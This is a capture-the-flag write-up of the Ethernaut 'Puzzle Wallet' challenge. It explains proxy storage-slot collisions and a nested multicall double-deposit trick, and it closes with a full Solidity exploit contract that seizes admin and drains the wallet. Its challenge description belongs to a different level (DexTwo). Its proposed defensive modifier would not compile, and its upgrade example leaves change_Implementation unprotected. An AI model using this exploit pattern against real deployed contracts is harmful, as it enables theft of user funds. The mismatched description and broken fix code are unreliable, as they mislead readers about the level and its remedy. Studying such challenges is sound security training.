# Writeup for Puzzle Wallet

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

This level will ask you to break DexTwo, a subtly modified Dex contract from the previous level, in a different way.

To succeed in this level, you need to drain all balances of token1 and token2 from the DexTwo contract.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

Things that might help:

How has the swap method been modified?

### Key Concepts To Learn

Everyone will say that once we write a contract and deploy it to the blockchain, there is no way we can change the contract. But what if I say there is a way in which you can change the logic of your contract?

Yes, there is a way to upgrade smart contracts.

If we write all our state variables in one contract and write the logic of how the first contract should work in another contract, then make a delegate call from the state variables contract to the logic contract, all the logic will be executed in the logic contract and state changes will be done in the state variables contract. Confused? Check the example below.

<details>

<summary> Click to view the example </summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract State_contract{

    uint256 public Latest_Random_Number;
    address implementation;

    constructor(address _addr){
        implementation=_addr;
    }

    function get_RandomNumber() public returns(uint256){
        implementation.delegatecall(abi.encodeWithSignature("generate_RandomNumber()"));
    }

}

contract Logic_contract{
    uint256 public Latest_Random_Number;

    function generate_RandomNumber() public{
        Latest_Random_Number=(block.timestamp)%69;

    }
}
```

</details>

First, we need to deploy the `Logic_contract`. Then we need to deploy the `State_contract` by passing the address of the `Logic_contract` as an argument to the constructor.

When we call `get_RandomNumber()` in `State_contract`, the function will make a `delegate call` to `generate_RandomNumber()` in `Logic_contract` and set the `Latest_Random_Number` to `(block.timestamp)%69`. Now, since it is a `delegate call`, the logic will be executed in the `Logic_contract` and the variable `Latest_Random_Number` will be changed in the `State_contract`.

I hope this makes sense. I suggest everyone try out the above example in Remix by deploying it in Remix test environments.

Now, what if we wanted to change the method in which the random number is generated? Should we deploy the above two contracts again? No, instead of deploying the two contracts again, we can add one more function to change the implementation (logic contract) address during the first deployment itself. Check the example below.

<details>

<summary> Click to view the example </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract State_contract{
    uint256 public Latest_Random_Number;
    address owner;
    address implementation;

    constructor(address _addr){
        implementation=_addr;
        owner=msg.sender;
    }
    modifier onlyOwner(){
        require(msg.sender==owner);
        _;
    }
    function get_RandomNumber()public returns(uint256){
        implementation.delegatecall(abi.encodeWithSignature("generate_RandomNumber()"));
    }

    function change_Implementation(address _newImplementation)public{
        implementation=_newImplementation;
    }
}

contract Logic_contract{
    uint256 public Latest_Random_Number;

    function generate_RandomNumber()public{
        Latest_Random_Number=(block.timestamp)%69;
    }
}

contract Updated_Logic_contract{
    uint256 public Latest_Random_Number;

    function generate_RandomNumber()public{
        Latest_Random_Number=uint256(blockhash(block.number-1));
    }
}
```

</details>

Deploy the first two contracts same as the first example. The difference between `State_contract` in the first example and now is that we added a function to change the address of the implementation in the new example.

So, if we deploy this example same as the first example, whenever we call the `get_RandomNumber()` function, it will make a `delegate call` to `Logic_contract` and execute the logic in `Logic_contract`, changing the `Latest_Random_Number` in `State_contract`. Now, the logic in which the random number is determined is `(block.timestamp)%69`.

Suppose we wanted to change the logic in which the random number is generated. Now, what we do is write a new contract with a new logic for random number calculation and deploy the new contract. Once the deployment is completed, we will copy the address of the new logic address and pass the new logic address while calling the `change_Implementation()` function in the Logic contract.

The next time we call `get_RandomNumber()` in `State_contract`, the random number will be generated from the new logic contract. In this example, we have written a new contract named `Updated_Logic_contract` and changed the logic in which the random number is generated.

I hope this makes sense. I suggest everyone try out the above example in Remix by deploying it in Remix test environments.

### Contract Explanation

If you are in this challenge, then you would have probably solved the challenges related to delegate call and storage layout of contracts.

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

<details>
<summary>Click to view the source contract and contract explanation</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

```

In the challenge, they have given us two contracts: `PuzzleProxy` and `PuzzleWallet`. `PuzzleProxy` inherits the `UpgradeableProxy` contract. Here, they have implemented upgradable logic for the `PuzzleProxy` contract. `PuzzleProxy` contract is similar to our `State_contract`, and `PuzzleWallet` contract is similar to our `Logic_contract`. The function logics are written in the `PuzzleWallet` contract, and state changes are done in the `PuzzleProxy` contract.

If you have skipped the concepts part, you might not know what `State_contract` and `Logic_contract` are.

Click [here](https://github.com/pancakeswap/pancake-swap-lib/blob/master/contracts/proxy/UpgradeableProxy.sol) to view the `UpgradeableProxy` contract.

The `UpgradeableProxy` contract constructor takes two arguments: the logic contract address and the init data as input. The constructor in `UpgradeableProxy` makes a `delegate call` to the logic contract with the init data passed to the constructor. I will briefly explain `UpgradeableProxy` in the concepts part.

The main difference between the example I have explained and the `PuzzleProxy` contract is the implementation of the logic contract in the state contract.

In our example, we have written functions in our `State_contract`, and those functions will make a delegate call to the `Logic_contract`. But here, since they are using the `UpgradeableProxy` contract, it will make a delegate call in a different way. When someone calls the `PuzzleProxy` contract with some data that doesn't match any function selector in the `PuzzleProxy` contract, then if there is a fallback() function in the `PuzzleProxy` contract, the call made will reach the fallback() function, and the logic in the fallback() function will execute. `PuzzleProxy` will make a delegate call to `PuzzleWallet` when the fallback() function is hit.

```solidity

 function _delegate(address implementation) internal {
    // solhint-disable-next-line no-inline-assembly
    assembly {
        // Copy msg.data. We take full control of memory in this inline assembly
        // block because it will not return to Solidity code. We overwrite the
        // Solidity scratch pad at memory position 0.
        calldatacopy(0, 0, calldatasize())

        // Call the implementation.
        // out and outsize are 0 because we don't know the size yet.
        let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

        // Copy the returned data.
        returndatacopy(0, 0, returndatasize())

        switch result
        // delegatecall returns 0 on error.
        case 0 { revert(0, returndatasize()) }
        default { return(0, returndatasize()) }
    }
}


function _fallback() internal {
    _beforeFallback();
    _delegate(_implementation());
}

```

The above code is from `proxy` contract which is inherited by `UpgradeableProxy` contract. If the above code doesn't make sense don't think much of it. Basically it will copy the calldata and makes delegate call to implemntation(PuzzleWallet) contract.

Now i will explain in detail of `PuzzleProxy` and `PuzzleWallet` contracts.

The `PuzzleProxy` contract has two state variables named `pendingAdmin` and `admin` of type address.

```solidity
constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }
```

The constructor of `PuzzleProxy` takes three arguments: `_admin` (address), `_implementation` (address), and `_initData` (bytes memory). It calls the constructor of `UpgradeableProxy` by passing the implementation address and init data as input. Then it sets the admin to `_admin` passed during the call.

```solidity
modifier onlyAdmin() {
    require(msg.sender == admin, "Caller is not the admin");
    _;
}

```

The modifier `onlyAdmin()` checks whether the `msg.sender` (caller) is the admin or not.

```solidity
function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
}
```

The function `proposeNewAdmin()` takes an argument of type `address` (`_newAdmin`) as input and sets the `pendingAdmin` to `_newAdmin`.

```solidity
function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
    require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
    admin = pendingAdmin;
}
```

The function `approveNewAdmin()` takes an argument of type `address` (`_expectedAdmin`) as input. It checks whether the `_expectedAdmin` and `pendingAdmin` are the same or not. If they match, then `admin` will be set to `pendingAdmin`. If they don't match, the function will revert. This function has a modifier `onlyAdmin`, which means the function can only be called by the admin. If someone else tries to call this function, it will revert.

```solidity
function upgradeTo(address _newImplementation) external onlyAdmin {
    _upgradeTo(_newImplementation);
}
```

The function `upgradeTo()` takes an argument of type `address` as input and executes the modifier `onlyAdmin`. If the modifier is passed, it will upgrade the implementation contract.

Now, I will explain only one important function of the `PuzzleWallet` contract. The other functions are understandable.

```solidity

function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}

```

The function `multicall()` takes a bytes array as input and executes the modifier `onlyWhitelisted`. If the modifier is passed, for each data in the array, the function will make a delegate call to the same contract with the data as each element of the array.

</details>

### Exploit

Our task is to become admin of the PuzzleProxy contract. If we open the instance address in block explorer we can find that the instance is having 0.001 amount of ether. Now let's start exploiting the contract.

```javascript
> contract.abi
```

If we enter the `contract.abi` we can find all the functions of PuzzleWallet contract. Now we may think that the given instance is an instance of PuzzleWallet contract. But it is not. They have given us the instance of PuzzleProxy contract and they just spoofed the abi of PuzzleWallet contract.

So all the state variables reading and writing will be done in `PuzzleProxy` contract and logic execution part will be done on `PuzzleWallet` contract.

```solidity

function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
}

function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
    require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
    admin = pendingAdmin;
}
```

Our task is become admin of the `PuzzleProxy` contract but if we see the `PuzzleProxy` contract anyone can propose the new admin but it will be only aprooved by the present admin. Since we are not the admin of the `PuzzleProxy` contract we won't be able to change the admin. So we need to think any different approach.

If we check the storage layout of `PuzzleProxy` and `PuzzleWallet`, we can see that both layouts are not the same. They are completely different. Even though they are different, the `PuzzleWallet` must have all the state variables of the `PuzzleProxy` contract, but both layouts are different. Since the `PuzzleProxy` contract makes a delegate call to the `PuzzleWallet` contract, we can exploit this discrepancy.

If we somehow change the `maxBalance` in `PuzzleWallet` during the delegate call, it will change the address of the admin in the `PuzzleProxy` contract.

During the delegate call in the sense, when we make a call to the `PuzzleProxy` contract with some data that matches the function selector of the `PuzzleWallet` contract, the `PuzzleProxy` will make a delegate call to the function that matches the function selector.

Our target is to change `maxBalance`.

```solidity

function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
}

function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}

```

The `maxBalance` is only changed in these two functions. It is not possible to change the `maxBalance` by calling `init()` because when `PuzzleProxy` makes a delegate call to `PuzzleWallet` and calls `init()`, the `maxBalance` will be the address of the admin converted to **uint256** and it won't be equal to zero. So we won't be able to call `init()`. In a delegate call, state variable readings and writings will be done on the caller contract.

The only way we can change `maxBalance` is by calling `setMaxBalance()`. However, there is a modifier `onlyWhitelisted`. In order to set `maxBalance`, we need to pass the modifier and drain the balance of the contract. The modifier will check whether the `msg.sender` is whitelisted or not. Here, `msg.sender` won't be the address of `PuzzleProxy`; it will be the address of the caller who is calling `PuzzleProxy` because in a delegate call, `msg.sender` and `msg.value` will be passed as the same.

<p align="center">
  <img src="img/img1.png" />
</p>

```solidity
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}
```

The above function will add the address passed to the whitelist. However, only the owner can call this function. The `owner` state variable is stored in `slot0`. In the `PuzzleProxy` contract, `slot0` stores `pendingAdmin`. Since anyone can propose the admin, if we propose our Exploit contract as the admin, then the exploit contract address will be stored as `pendingAdmin`.

After making `pendingAdmin` our exploit contract, we will be able to call `addToWhitelist()` in the `PuzzleWallet` contract. This is because we are interacting with `PuzzleProxy`, and `PuzzleProxy` is making a delegate call to `PuzzleWallet`. When the logic in `PuzzleWallet` reads some state variables, these state variables will be read from the `PuzzleProxy` contract.

Once we set the `pendingAdmin` to our exploit contract address, we will become the owner. The `setMaxBalance()` function also has an additional check to see if the contract balance is zero. So, we need to make the contract balance zero. Once this is done, we can change the `maxBalance`, which means we are changing the `admin`.

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success,) = to.call{value: value}(data);
    require(success, "Execution failed");
    }
```

The only way we can withdraw ether from the `PuzzleProxy` contract is by calling `execute()` in the `PuzzleWallet`. This function checks if we have sufficient balance to withdraw. If we have sufficient balance, then we can withdraw. Before withdrawing, we need to deposit some ether into the contract.

```solidity
function deposit() external payable onlyWhitelisted {
    require(address(this).balance <= maxBalance, "Max balance reached");
    balances[msg.sender] += msg.value;
}
```

The `deposit()` function in `PuzzleWallet` will check if the current balance of the `PuzzleProxy` contract is less than `maxBalance`. If it is less, then it updates the balance of `msg.sender` with `msg.value`.

The functions `deposit()` and `execute()` work normally, and we can't find many exploits there. However, there is one more way we can deposit ether: by calling `multicall()` with the data as the `deposit()` function selector. Now, let's deep dive into the `multicall()` function.

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

The above function takes a bytes array as input, and for each element in the array, it will get the function selector and check if the selector is the selector of the `deposit()` function. If it is `deposit()`, it will set `depositCalled` to true and then call `deposit()` using the delegate call. This check is important due to the properties of delegate call.

Assume there are three contracts: `contract_1`, `contract_2`, and `contract_3`. If we call a function in `contract_1` and that function makes a delegate call to `contract_2`, and then the function in `contract_2` makes a delegate call to `contract_3`, what will be the `msg.sender` and `msg.value` in `contract_3`? They will be the `msg.sender` and `msg.value` of `contract_1`.

<p align="center">
  <img src="img/img2.png" />
</p>

In the `multicall` function, if we try to call the `deposit()` function twice by passing its function selector in the `data` array, the transaction will revert. This is because `depositCalled` is initially set to `false`. When `deposit()` is called for the first time, `depositCalled` is set to `true`. On the second iteration, when `deposit()` is called again, the `require` statement will fail since `depositCalled` is now `true`, causing the transaction to revert with the message "Deposit can only be called once".

When someone wants to deposit two ether by sending only one ether, they might try to call the `multicall()` function by passing the function selector of `deposit()` in the `data` array twice. However, due to the `require` statement that checks if `depositCalled` is `false`, the transaction will revert on the second call. This prevents depositing twice with a single amount. If there were no `require` statement, it would be possible because `multicall()` is making a delegate call to `deposit()`, and the `msg.sender` and `msg.value` would be the same for each call. Check the below image.

<p align="center">
  <img src="img/img2.png" />
</p>

Assume there is no require statment and Suppose if we invoke multicall() with 1ether and data as function selector of deposit() twice then for the first time it will call deposit() and msg.value will be 1 ether and second time it will again call deposit() and msg.value will be 1 ether. So technically we made our balances as `2 ether` by depositing `1 ether`.

Due to the `require` statement, we can't call `deposit()` twice directly. However, if we pass the calldata to invoke `deposit()` as the first element of the `data` array, and then pass the calldata to invoke `multicall()` with the argument as calldata to invoke `deposit()`, we can bypass the `require` check. This way, we can set our balance to 2 ether by sending only 1 ether.

Now, if we check the balance of the `PuzzleProxy` contract, it is 0.001 ether. So, we need to deposit 0.001 ether to make our balance 0.002 ether and then withdraw all the ether.

<p align="center">
  <img src="img/img3.png" />
</p>

Now let's write our exploit contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IProxy{
    function proposeNewAdmin(address) external;
    function approveNewAdmin(address) external ;
    function setMaxBalance(uint256) external;
    function addToWhitelist(address) external;
    function deposit() external payable ;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
    function admin()external view returns(address);
}



contract ExploitPuzzleProxy{
    IProxy proxy;
    address player;
    constructor(address _proxy){
        proxy=IProxy(_proxy);
        player=msg.sender;
    }

    function Exploit()public payable{
        proxy.proposeNewAdmin(address(this));
        proxy.addToWhitelist(address(this));

        bytes[] memory main_data=new bytes[](2);
        bytes[] memory second_deposit=new bytes[](1);
        second_deposit[0]=abi.encodeWithSignature("deposit()");

        main_data[0]=second_deposit[0];
        main_data[1]=abi.encodeWithSignature("multicall(bytes[])",second_deposit);

        proxy.multicall{value:0.001 ether}(main_data);
        proxy.execute(player,0.002 ether,"");
        uint256 Player_Address=uint256(uint160(player));
        proxy.setMaxBalance(Player_Address);
        require(proxy.admin()==player, "Exploit Failed");
    }
}


```

Deploy this contract and call the exploit function by sending `0.001 ether` or `1000000000000000 wei`. Once the call is done the challenge will be solved.

That's it for this challenge see you in the next challenge.

If you are a beginner to blockchain and understanding this challenge, it's a really great thing. Be proud of yourself.

### Key Takeaways

Whenever we implement upgradable contracts, we need to be very careful while designing the storage layout. The logic contract and state variables contract should have the same storage layout. In this challenge, a major part of the exploit was due to the storage layout.

In order to safeguard the `multicall`, we need to write a modifier that handles the inner call to `multicall`.

```solidity

modifier Handle_Deposit(address _depositer,bytes[] _calldata){
    bytes4 memory data = abi.encodeWithSelector(this.multicall.selector);
    for(uint i=0;i<_calldata.length;i++){
        if(keccak256(abi.encodePacked(bytes4(_calldata[i])))==keccak256(abi.encodePacked(data))){
            revert("Calling multicall is not allowed here");
        }
    }
    _;
}

```

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
